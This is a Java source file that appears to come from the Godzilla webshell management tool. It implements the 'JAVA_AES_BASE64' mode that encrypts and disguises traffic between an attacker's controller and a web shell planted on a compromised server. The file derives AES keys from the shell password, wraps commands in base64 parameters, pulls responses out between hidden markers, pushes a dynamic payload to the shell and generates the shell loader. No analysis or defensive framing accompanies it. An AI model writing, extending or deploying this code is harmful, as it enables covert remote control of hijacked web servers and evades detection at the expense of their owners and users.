package net.BeichenDream.Godzilla.shells.cryptions.JavaAes;

import net.BeichenDream.Godzilla.core.annotation.CryptionAnnotation;
import net.BeichenDream.Godzilla.core.imp.Cryption;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.Http;

@CryptionAnnotation(Name = "JAVA_AES_BASE64", payloadName = "JavaDynamicPayload")
public class JavaAesBase64 implements Cryption {
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String findStrLeft;
    private String findStrRight;
    private Http http;
    private String key;
    private String pass;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override // core.imp.Cryption
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
        this.findStrRight = findStrMd5.substring(16).toUpperCase();
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
                return;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override // core.imp.Cryption
    public byte[] encode(byte[] data) {
        try {
            return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override // core.imp.Cryption
    public byte[] decode(byte[] data) {
        try {
            return this.decodeCipher.doFinal(functions.base64Decode(findStr(data)));
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
    }

    @Override // core.imp.Cryption
    public boolean isSendRLData() {
        return true;
    }

    @Override // core.imp.Cryption
    public boolean check() {
        return this.state;
    }

    @Override // core.imp.Cryption
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}